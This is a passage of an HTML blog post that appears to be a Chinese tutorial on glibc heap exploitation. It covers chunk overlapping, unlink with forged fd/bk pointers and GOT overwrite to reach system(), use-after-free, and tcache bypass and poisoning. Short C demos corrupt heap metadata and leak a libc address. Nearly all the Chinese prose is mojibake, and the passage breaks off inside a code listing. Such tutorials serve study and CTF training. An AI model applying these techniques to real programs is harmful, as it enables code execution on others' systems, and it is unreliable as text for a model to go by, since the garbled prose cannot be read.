src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extendlap-gdb5.png"></p><h5 id="ğŸŒ°5ï¼šé€šè¿‡-extend-å‘å‰-overlapping"><a href="#ğŸŒ°5ï¼šé€šè¿‡-extend-å‘å‰-overlapping" class="headerlink" title="ğŸŒ°5ï¼šé€šè¿‡ extend å‘å‰ overlapping"></a>ğŸŒ°5ï¼šé€šè¿‡ extend å‘å‰ overlapping</h5><p>å‰å‘ extend åˆ©ç”¨äº† smallbin çš„ unlink æœºåˆ¶ï¼Œé€šè¿‡ä¿®æ”¹ pre_size åŸŸå¯ä»¥è·¨è¶Šå¤šä¸ª chunk è¿›è¡Œåˆå¹¶å®ç° overlappingã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> *ptr1,*ptr2,*ptr3,*ptr4;<br>    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);      <span class="hljs-comment">//smallbin1</span><br>    ptr2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);    <span class="hljs-comment">//fastbin1</span><br>    ptr3=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);    <span class="hljs-comment">//fastbin2</span><br>    ptr4=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);     <span class="hljs-comment">//smallbin2</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);    <span class="hljs-comment">//é˜²æ­¢ä¸topåˆå¹¶</span><br>    <span class="hljs-built_in">free</span>(ptr1);<br>    *(<span class="hljs-type">int</span> *)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr4<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0x90</span>;  <span class="hljs-comment">//ä¿®æ”¹pre_inuseåŸŸ</span><br>    *(<span class="hljs-type">int</span> *)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr4<span class="hljs-number">-0x10</span>)=<span class="hljs-number">0xd0</span>;  <span class="hljs-comment">//ä¿®æ”¹pre_sizeåŸŸ</span><br>    <span class="hljs-built_in">free</span>(ptr4);  <span class="hljs-comment">//unlinkè¿›è¡Œå‰å‘extend</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x150</span>);  <span class="hljs-comment">//å ä½å—</span><br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¬¡freeåçš„å †ç»“æ„å¦‚ä¸‹</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extendlap2-gdb2.png"></p><p>å¯¹æ•°æ®è¿›è¡Œä¿®æ”¹å <code>free(ptr4)</code> å¯ä»¥å‘ç° chunk è¢«åˆå¹¶äº†</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extendlap2-gdb3.png"></p><h1 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h1><p>unlink æœºåˆ¶çš„å­˜åœ¨æ˜¯ä¸ºäº†é˜²æ­¢å†…å­˜è¿‡åº¦ç¢ç‰‡åŒ–ã€‚å½“ä¸€ä¸ª chunk è¢«é‡Šæ”¾æ—¶ï¼Œè¯¥ chunk é fastbin æˆ– tcache bin ï¼Œlibc å°±ä¼šæ£€æŸ¥è¯¥å †å—å‰åæ˜¯å¦æœ‰ chunk å±äºè¢«é‡Šæ”¾çš„çŠ¶æ€ï¼Œå¦‚æœå­˜åœ¨ï¼Œå°±ä¼šå°†ä»–ä»¬ä» bin ä¸­å–å‡ºè¿›è¡Œåˆå¹¶ï¼Œå³ä½¿è¿™äº›å‰åçš„å †å—æ˜¯åœ¨ fast bin æˆ–è€… tcache bin ä¸­ã€‚</p><h3 id="åŸç†-2"><a href="#åŸç†-2" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>unlink çš„è¿‡ç¨‹å°±ç±»ä¼¼äºæŠŠåŒå‘é“¾è¡¨ä¸­é—´çš„ç©ºé—² chunk å–å‡ºæ¥ï¼Œå…·ä½“æµç¨‹å¦‚ä¸‹ï¼š</p><p>æœ€åˆ bin ä¸­çš„å †å—åƒæœ€ä¸Šå›¾é‚£æ ·é“¾æ¥ï¼ŒP æ˜¯æˆ‘ä»¬é‡Šæ”¾çš„å †å—ï¼Œ BK æ˜¯ P å¯¹åº”é“¾è¡¨å‰æ–¹çš„å †å—ï¼Œ FD æ˜¯åé¢çš„å †å—ã€‚unlink ç»“æŸåå°±å˜æˆäº†æœ€ä¸‹å›¾ï¼Œæ­¤æ—¶p åœ¨ FD çš„ data ä¸­ï¼Œç„¶å BK å’Œ FD ç›´æ¥ç›¸è¿ã€‚</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unlink_intro.png"></p><p>æˆ‘ä»¬å…ˆä»å·²ç»è¢«æ·˜æ±°çš„é˜²æŠ¤æ—¶çš„ unlink å¼€å§‹å­¦ä¹ å…¶åŸç†</p><h5 id="è¢«æ·˜æ±°çš„-unlink"><a href="#è¢«æ·˜æ±°çš„-unlink" class="headerlink" title="è¢«æ·˜æ±°çš„ unlink"></a>è¢«æ·˜æ±°çš„ unlink</h5><p>æˆ‘ä»¬å‡è®¾å †å†…çš„ç»“æ„å¦‚ä»¥ä¸‹å·¦å›¾ï¼Œç°åœ¨æœ‰ç‰©ç†ç©ºé—´è¿ç»­çš„ä¸¤ä¸ª chunkï¼ˆQï¼ŒNextchunkï¼‰ï¼Œå…¶ä¸­ Q å¤„äºä½¿ç”¨çŠ¶æ€ã€Nextchunk å¤„äºé‡Šæ”¾çŠ¶æ€ã€‚</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/old_unlink_vul.png"></p><p>é‚£ä¹ˆå¦‚æœæˆ‘ä»¬é€šè¿‡æŸç§æ–¹å¼ï¼ˆæ¯”å¦‚æº¢å‡ºï¼‰å°† Nextchunk çš„ fd å’Œ bk æŒ‡é’ˆä¿®æ”¹ä¸ºæŒ‡å®šçš„å€¼ã€‚åˆ™å½“æˆ‘ä»¬ free(Q) æ—¶ï¼Œä¼šä¾æ¬¡è¿›è¡Œä¸‹é¢çš„æ“ä½œï¼š</p><ul><li>glibc åˆ¤æ–­è¿™ä¸ªå—å±äº small chunk</li><li>åˆ¤æ–­æ˜¯å¦éœ€è¦å‘å‰åˆå¹¶ï¼Œå‘ç°å‰ä¸€ä¸ª chunk å¤„äºä½¿ç”¨çŠ¶æ€ï¼Œä¸éœ€è¦å‘å‰åˆå¹¶</li><li>åˆ¤æ–­æ˜¯å¦éœ€è¦å‘ååˆå¹¶ï¼Œåä¸€ä¸ª chunk ç©ºé—²ï¼Œéœ€è¦åˆå¹¶</li><li>è¿›è¡Œ unlink æ“ä½œ</li></ul><p> unlink å…·ä½“æ‰§è¡Œçš„æ•ˆæœå¦‚ä¸‹ï¼š</p><ul><li><p><code>FD = P-&gt;fd = target addr - 12</code>  ï¼Œå³å°† <em>FD</em> å­—æ®µèµ‹å€¼ä¸ºå †å— P çš„ <em>fd</em> å­—æ®µæ‰€å­˜å‚¨çš„æ•°æ® target addr - 12 </p></li><li><p><code>BK = P-&gt;bk = expect value</code> ï¼Œå³å°† <em>BK</em> å­—æ®µèµ‹å€¼ä¸ºå †å— P çš„ <em>bk</em> å­—æ®µæ‰€å­˜å‚¨çš„æ•°æ® expect value ï¼ˆæˆ‘ä»¬é¢„æœŸæ”¹å†™çš„æ•°æ®ï¼‰ã€‚</p></li><li><p><code>FD-&gt;bk = BK</code> ï¼Œå³å°† <em>target addr - 12 + 12</em> å¤„çš„å†…å®¹ï¼ˆ target addr æœ¬èº«ï¼‰è®¾ç½®ä¸º expect valueã€‚</p></li><li><p><code>BK-&gt;fd = FD</code>ï¼Œå³å°† <em>expect value + 8</em> å¤„çš„å†…å®¹è®¾ç½®ä¸º target addr - 12ã€‚</p></li></ul><p>åœ¨è¿™é‡Œæˆ‘ä»¬éœ€è¦ç¡®ä¿ expect value + 8 å¤„çš„åœ°å€å…·æœ‰å¯å†™çš„æƒé™ï¼Œå¦åˆ™å¯èƒ½æ— æ³•æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´ã€‚</p><p>æˆåŠŸæ‰§è¡Œ unlink æ¼æ´åˆ©ç”¨åï¼Œä¼šå°†ç›®æ ‡åœ°å€å¤„çš„å€¼è®¾ç½®ä¸ºæˆ‘ä»¬é¢„æœŸçš„å†…å®¹ï¼Œä»è€Œå®ç°ä»»æ„åœ°å€å†™æ“ä½œã€‚</p><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´æ¥å°†æŸä¸ª GOT è¡¨é¡¹æŒ‡å‘ç³»ç»Ÿå‡½æ•°æˆ–è€…æˆ‘ä»¬æƒ³è¦è°ƒç”¨çš„å‡½æ•°ï¼Œä»è€ŒåŠ«æŒç¨‹åºæ‰§è¡Œæµç¨‹ã€‚ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œexpect value + 8 å¤„çš„å€¼ä¹Ÿä¼šè¢«ç ´åï¼Œå¯èƒ½ä¼šå½±å“ç¨‹åºçš„æ­£å¸¸æ‰§è¡Œï¼Œå› æ­¤åœ¨åˆ©ç”¨æ¼æ´æ—¶éœ€è¦ä»”ç»†è€ƒè™‘å’Œå¤„ç†è¿™äº›å½±å“ã€‚</p><h3 id="å½“å‰çš„-unlink"><a href="#å½“å‰çš„-unlink" class="headerlink" title="å½“å‰çš„ unlink"></a>å½“å‰çš„ unlink</h3><p>å“ˆå“ˆå“ˆï¼Œæ€ä¹ˆä¼šè¿™ä¹ˆç®€å•å‘¢ğŸ¤ª</p><p>ç°åœ¨çš„ unlink å®ç°ä¹‹å‰ä¼šå¯¹ chunk çš„ size å’ŒåŒå‘é“¾è¡¨è¿›è¡Œæ£€æŸ¥ ï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// æ£€æŸ¥ P çš„å¤§å°æ˜¯å¦ä¸å…¶ç›¸é‚»å †å—çš„ prev_size å­—æ®µä¸€è‡´ï¼ˆsizeæ£€æŸ¥ï¼‰</span><br><span class="hljs-keyword">if</span> (__builtin_expect(chunksize(P) != prev_size(next_chunk(P)), <span class="hljs-number">0</span>)) <br>&#123;<br>    malloc_printerr(<span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// æ£€æŸ¥ P çš„ fd å’Œ bk æŒ‡é’ˆæ˜¯å¦ä¸å…¶å‰ååŒå‘é“¾è¡¨èŠ‚ç‚¹çš„æŒ‡é’ˆä¸€è‡´ï¼ˆåŒå‘é“¾è¡¨å®Œæ•´æ€§æ£€æŸ¥ï¼‰</span><br><span class="hljs-keyword">if</span> (__builtin_expect(FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>)) <br>&#123;<br>    malloc_printerr(check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);<br>&#125;<br><br><span class="hljs-comment">// åœ¨ largebin ä¸­ï¼Œæ£€æŸ¥ P çš„ next_size æŒ‡é’ˆæ˜¯å¦ä¸å…¶å‰ååŒå‘é“¾è¡¨èŠ‚ç‚¹çš„æŒ‡é’ˆä¸€è‡´ï¼ˆåŒå‘é“¾è¡¨å®Œæ•´æ€§æ£€æŸ¥ï¼‰</span><br><span class="hljs-keyword">if</span> (__builtin_expect(P-&gt;fd_nextsize-&gt;bk_nextsize != P || P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="hljs-number">0</span>)) <br>&#123;<br>    malloc_printerr(check_action, <span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>, P, AV);<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­å°±æœ‰å¯¹ fd å’Œ bk çš„æ£€æŸ¥ã€‚è€Œä¸Šé¢çš„æƒ…å†µä¸­ï¼Œå°±ä¼šè¢«æ£€æŸ¥å‡ºæ¥ï¼Œæˆ‘ä»¬æ— æ³•ä½¿ç”¨è¿™ç§æ–¹æ³•ã€‚</p><p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä¼ªé€ å †å—æ¥ç»•è¿‡æ£€æŸ¥ğŸ˜ï¼Œæˆ‘ä»¬æœ‰ä¸€ä¸ªå…¬å¼ï¼š</p><ol><li>P -&gt; fd -&gt; bk &#x3D;&#x3D; P &lt;&#x3D;&gt; *( P -&gt; fd + 0x18 ) &#x3D;&#x3D; P</li><li>p -&gt; bk -&gt; fd &#x3D;&#x3D; P &lt;&#x3D;&gt; *( p -&gt; bk + 0x10 ) &#x3D;&#x3D; P</li></ol><p>ç®€å•ç‚¹è¯´å°±æ˜¯ï¼š</p><ol><li><strong>P -&gt; fd &#x3D; &amp; P - 0x18</strong></li><li><strong>P -&gt; bk &#x3D; &amp; P - 0x10</strong></li></ol><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unlink.png"></p><p>è§¦å‘unlinkåPå¤„çš„æŒ‡é’ˆä¼šå˜ä¸º P-0x18 ã€‚</p><p>å¦‚æœå°†ä¸Šé¢è¯´çš„På˜ä¸ºæˆ‘ä»¬æƒ³è¦ä¿®æ”¹çš„åœ°å€æ¯”å¦‚ä¿å­˜æŒ‡é’ˆçš„æ•°ç»„åœ°å€ï¼Œåˆ©ç”¨ä¸Šé¢è¯´åˆ°çš„ unlink å°±èƒ½æ§åˆ¶æ•°ç»„ä¸­çš„æŒ‡é’ˆï¼Œå¹¶ä¸”æˆ‘ä»¬ä½¿æŒ‡é’ˆä¿å­˜ç±»ä¼¼ free_gotã€puts_got ç­‰ï¼Œä¹‹åæˆ‘ä»¬ä¿®æ”¹æŒ‡é’ˆä½¿å…¶ä¸º system_got ï¼Œé‚£ä¹ˆä¸‹æ¬¡æˆ‘ä»¬è°ƒç”¨å…¶ä»–å‡½æ•°å°±ä¼šè°ƒç”¨ systemï¼ˆï¼‰ã€‚</p><h1 id="Use-After-Free"><a href="#Use-After-Free" class="headerlink" title="Use After Free"></a>Use After Free</h1><p>Use After Free å°±æ˜¯å†…å­˜å—è¢«é‡Šæ”¾ä»¥åå†æ¬¡è¢«åˆ©ç”¨ï¼Œæœ‰ä»¥ä¸‹å‡ ç§æƒ…å†µï¼š</p><ul><li>å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆè¢«è®¾ç½®ä¸º NULLï¼Œå†æ¬¡åˆ©ç”¨æ—¶ç¨‹åºå°±ä¼šå´©æºƒ</li><li>å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆæ²¡æœ‰è¢«è®¾ç½®ä¸º NULL ï¼Œè€Œä¸”ç„¶ååœ¨å®ƒä¸‹ä¸€æ¬¡è¢«ä½¿ç”¨ä¹‹å‰ï¼Œæ²¡æœ‰ä»£ç å¯¹è¿™å—å†…å­˜å—è¿›è¡Œä¿®æ”¹ï¼Œé‚£ä¹ˆç¨‹åºå¯ä»¥æ­£å¸¸è¿è½¬ã€‚</li><li>å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆæ²¡æœ‰è¢«è®¾ç½®ä¸º NULLï¼Œä½†æ˜¯åœ¨å®ƒä¸‹ä¸€æ¬¡ä½¿ç”¨ä¹‹å‰ï¼Œæœ‰ä»£ç å¯¹è¿™å—å†…å­˜è¿›è¡Œäº†ä¿®æ”¹ï¼Œé‚£ä¹ˆå½“ç¨‹åºå†æ¬¡ä½¿ç”¨è¿™å—å†…å­˜æ—¶ï¼Œå°±å¾ˆæœ‰å¯èƒ½ä¼šå‡ºç°é—®é¢˜ã€‚</li></ul><p>æˆ‘ä»¬ä¸€èˆ¬æ‰€æŒ‡çš„ Use After Free æ¼æ´ä¸»è¦æ˜¯åä¸¤ç§ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬ä¸€èˆ¬ç§°è¢«é‡Šæ”¾åæ²¡æœ‰è¢«è®¾ç½®ä¸º NULL çš„å†…å­˜æŒ‡é’ˆä¸º dangling pointer ï¼ˆå®ƒçš„ä¸­æ–‡ç¿»è¯‘å«è¿·é€”æŒ‡é’ˆğŸ˜Šï¼‰ã€‚</p><p>å®ƒçš„å®é™…åº”ç”¨å°±æ˜¯æˆ‘ä»¬åœ¨åƒæ˜¯ chunk extend é‡Œé¢ç”¨åˆ°çš„ç¤ºä¾‹2</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">void</span> *ptr1,*ptr2,*ptr3;<br>    ptr1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    ptr2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);      <span class="hljs-comment">//é˜²æ­¢ä¸top chunkåˆå¹¶</span><br>    <br>    <span class="hljs-built_in">free</span>(ptr1);<br>    *(<span class="hljs-type">int</span> *)((<span class="hljs-type">int</span>)ptr1<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0xb1</span>;  <span class="hljs-comment">// Use After Free</span><br>    ptr3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa0</span>);  <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Tcache-attack"><a href="#Tcache-attack" class="headerlink" title="Tcache attack"></a>Tcache attack</h1><blockquote><p>è¿™ä¸€éƒ¨åˆ†æˆ‘çš„ç¯å¢ƒæ˜¯Ubuntu18 libc2.27</p></blockquote><h3 id="ç®€è¿°"><a href="#ç®€è¿°" class="headerlink" title="ç®€è¿°"></a>ç®€è¿°</h3><p>Tcache å…¨åä¸º Thread Local Cachingï¼Œåœ¨ libc2.26 ä¹‹åæ‰å‡ºç°ã€‚å®ƒä¸ºæ¯ä¸ªçº¿ç¨‹åˆ›å»ºä¸€ä¸ªç¼“å­˜ï¼Œé‡Œé¢åŒ…å«äº†ä¸€äº›å°å †å—ã€‚</p><p>Tcache bin æ˜¯å•é“¾è¡¨çš„æ•°æ®ç»“æ„ï¼Œå­˜å‚¨ç›¸åŒå¤§å°çš„ç©ºé—²å †å—ï¼Œsizeå¤§å°èŒƒå›´æ˜¯ 0x20-0x410ï¼Œå…è®¸å­˜æ”¾çš„ chunk æ•°ä¸º7ã€‚å½“ä½ ä½¿ç”¨ <code>free()</code> å‡½æ•°é‡Šæ”¾ä¸€ä¸ªå †å—æ—¶ï¼Œglibc ä¼šå°†è¯¥å †å—æ”¾å…¥é€‚å½“å¤§å°ç±»åˆ«çš„ Tcache bin ä¸­ï¼Œä»¥å¤‡åç»­å†æ¬¡åˆ†é…ã€‚Tcache bin é‡‡ç”¨å…ˆè¿›åå‡ºçš„ç­–ç•¥ï¼Œä¸” prev_inuse ä½ä¸ä¼šè¢«åˆå¹¶ï¼Œä¹Ÿå°±æ˜¯è¯´ tcache bin ä¸­çš„ chunk ä¸ä¼šè¢«åˆå¹¶ã€‚</p><h3 id="æ”»å‡»æ–¹å¼"><a href="#æ”»å‡»æ–¹å¼" class="headerlink" title="æ”»å‡»æ–¹å¼"></a>æ”»å‡»æ–¹å¼</h3><p>åœ¨æœ‰äº† tcache æœºåˆ¶ä»¥åï¼Œæ— è®ºæ˜¯åˆ†é…è¿˜æ˜¯é‡Šæ”¾å †å—ï¼Œtcache éƒ½æ˜¯é¦–å…ˆè¢«åˆ©ç”¨çš„ï¼Œç›´åˆ°è¾¾åˆ°æ¯ä¸€ä¸­ bin çš„ä¸Šé™ 7 ä¸ºæ­¢ã€‚è¿˜æœ‰ä¸€ç§æƒ…å†µå°±æ˜¯ fast bin æˆ–è€… small bin è¿”å›äº†ä¸€ä¸ªå †å—ï¼Œä¸” tcache å¯¹åº”å¤§å°çš„ bin ä¸­æœªæ»¡çš„è¯ï¼Œé‚£ä¹ˆè¯¥fast bin æˆ–è€… samll bin é“¾ä¸­çš„å †å—ä¼šè¢«åŠ å…¥åˆ°å¯¹åº” tcache bin ä¸­ç›´è‡³å…¶ä¸Šé™ã€‚</p><h4 id="ç»•è¿‡-Tcache"><a href="#ç»•è¿‡-Tcache" class="headerlink" title="ç»•è¿‡ Tcache"></a>ç»•è¿‡ Tcache</h4><p>Tcache æœºåˆ¶æ— éå°±æ˜¯å¢åŠ äº†ä¸€å±‚ç¼“å­˜ï¼Œç»•è¿‡ Tcache å°±æ˜¯æˆ‘ä»¬æ‰‹åŠ¨æ„é€ å¡«å……å †å—å¡«æ»¡æŸä¸€ä¸ªå¤§å°å¯¹åº”çš„ thcache bin é“¾è¡¨ï¼Œä½¿å¾—åœ¨å†æ¬¡å›æ”¶çš„ bin è¿›å…¥unsorted bin æˆ–è€… small binï¼Œlarge bin ç­‰ç­‰ï¼Œå†åˆ©ç”¨è¿™äº› bin å¾—åˆ° libc åŸºå€ã€‚</p><p>åŸç†å¤§è‡´å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *ptr[<span class="hljs-number">7</span>];<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br><span class="hljs-comment">// ç”³è¯·7ä¸ªï¼Œé‡Šæ”¾7ä¸ªï¼Œå¡«æ»¡tcache bin[0x90]</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++)<br>        ptr[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++)<br>        <span class="hljs-built_in">free</span>(ptr[i]);<br>    <span class="hljs-comment">// è¿™é‡Œå†é‡Šæ”¾aï¼Œå°±ä¼šæ”¾å…¥åˆ°unsorted binä¸­</span><br>    <span class="hljs-built_in">free</span>(a);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;libc addr is %llx\n&quot;</span>,  *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>*)a);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/thcache-bypass.png"></p><p>å¦‚ä¸Šæˆ‘ä»¬å°±æ³„éœ²å‡ºäº† main_arena çš„åœ°å€ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥é€šè¿‡ret2libcæ—¶ç”¨åˆ°çš„å¥—è·¯æ³„éœ²libcåŸºå€è¿›è€Œè°ƒç”¨ç›®æ ‡å‡½æ•°å•¦ã€‚</p><h4 id="åˆ†é…å †åˆ°æŒ‡å®šçš„åœ°å€"><a href="#åˆ†é…å †åˆ°æŒ‡å®šçš„åœ°å€" class="headerlink" title="åˆ†é…å †åˆ°æŒ‡å®šçš„åœ°å€"></a>åˆ†é…å †åˆ°æŒ‡å®šçš„åœ°å€</h4><p>åœ¨å †çš„åˆ©ç”¨ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸ä¼šéœ€è¦æŠŠå †çš„æŒ‡é’ˆåˆ†é…åˆ°æˆ‘ä»¬æƒ³è¦çš„åœ°å€ä¸Šå»ï¼Œæ¯”å¦‚BSSæ®µæˆ–è€…ç›´æ¥æŒ‡å‘æ ˆç©ºé—´å®ç°ç¨‹åºæµçš„æ“æ§ï¼ŒæŠ‘æˆ–æ˜¯å°†å †å—é‡æ–°åˆ†é…ã€‚</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹å‡ ç§æ–¹æ³•å®ç°ï¼š</p><h5 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h5><p>tcache poisoningçš„åˆ©ç”¨æ€è·¯å¦‚ä¸‹ï¼š</p><ul><li><p>åˆ†é…ä¸€ä¸ªç›®æ ‡å¤§å°çš„å †å—ï¼Œå†å°†å…¶é‡Šæ”¾</p></li><li><p>åˆ©ç”¨å †æº¢å‡ºç­‰æ¼æ´ï¼Œå°†åˆšåˆšé‡Šæ”¾çš„å †å—çš„æŸä¸ªæŒ‡é’ˆï¼ˆä¾‹å¦‚ <code>fd</code> æˆ– <code>bk</code> ï¼‰ä¿®æ”¹ä¸ºæˆ‘ä»¬å¯æ§çš„åœ°å€æŒ‡é’ˆï¼ˆå¦‚ <code>__free_hook </code>æˆ– <code>__malloc_hook</code> ç­‰å±€éƒ¨å˜é‡çš„åœ°å€ï¼‰ã€‚</p></li><li><p>å†æ¬¡å»ºç«‹ç›¸åŒå¤§å°çš„å †å—å¹¶é‡Šæ”¾ï¼Œè¿™æ ·è¯¥å †å—çš„å†…å®¹ä¼šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„ tcache é“¾è¡¨èŠ‚ç‚¹ã€‚</p></li><li><p>å†æ¬¡å»ºç«‹ç›¸åŒå¤§å°çš„å †å—ï¼Œæ­¤æ—¶ tcache ä¼šå°†ä¹‹å‰å¡«å……çš„ç›®æ ‡æŒ‡é’ˆåœ°å€ä½œä¸ºè¿”å›å€¼è¿”å›ç»™è°ƒç”¨è€…ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿™æ®µåœ°å€å†…å†™å…¥æ”»å‡»ä»£ç ï¼Œç¨‹åºæ‰§è¡Œåˆ°ç›®æ ‡åœ°å€ï¼Œå°±å¯ä»¥å®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚</p><blockquote><p>å› ä¸º fd æŒ‡é’ˆä¼šè¿”å›ç©ºé—²å †å—åœ°å€ç»™ç¨‹åºï¼Œè€Œè¿™ä¸ªåœ°å€è¢«æˆ‘ä»¬æ›¿æ¢æˆäº†ç›®æ ‡åœ°å€ï¼Œæ‰€ä»¥å®é™…ä¸Šè¿”å›å€¼æ˜¯ç›®æ ‡åœ°</p></blockquote></li></ul><p> åŸç†å¤§è‡´å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 